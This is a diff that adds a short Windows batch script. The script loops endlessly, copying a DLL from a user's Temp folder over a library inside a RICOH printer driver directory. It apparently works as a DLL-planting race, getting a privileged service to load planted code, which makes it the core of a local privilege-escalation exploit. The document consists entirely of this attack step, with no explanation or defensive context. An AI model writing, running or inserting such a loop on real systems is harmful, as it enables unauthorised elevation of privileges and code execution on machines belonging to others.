@@ -1,0 +1,2 @@
+:repeat
+copy /y "C:\Users\FSmith\AppData\Local\Temp\headerfooter.dll" "C:\ProgramData\RICOH_DRV\RICOH Aficio SP 8300DN PCL 6\_common\dlz\headerfooter.dll" && goto :repeat
